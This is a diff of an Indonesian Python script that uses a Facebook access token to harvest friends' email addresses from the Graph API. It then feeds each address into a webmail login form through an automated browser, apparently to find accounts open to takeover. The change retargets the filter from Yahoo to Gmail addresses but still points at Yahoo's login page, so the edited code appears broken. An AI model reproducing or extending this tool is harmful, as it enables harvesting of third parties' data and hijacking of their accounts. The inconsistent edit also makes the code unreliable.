@@ -20,7 +20,7 @@ else:
 get_friends = requests.get('https://graph.facebook.com/me/friends?access_token='+token)
 hasil = json.loads(get_friends.text)
 print ("\033[39m[\033[31m+\033[39m] Berhasil Mendapatkan ID Teman...")
-#cok = open('Mail_Yahoo.txt','w')
+#cok = open('email_gmail.txt','w')
 def defense():
     global o, h
     o = []
@@ -38,8 +38,8 @@ def defense():
         try:
             kunci = re.compile(r'@.*')
             cari = kunci.search(z['email']).group()
-            if 'yahoo.com' in cari:
-                br.open("https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com")
+            if 'gmail.com' in cari:
+                br.open("https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.gmail.com")
                 br._factory.is_html = True
                 br.select_form(nr=0)
                 br["username"] = z['email']
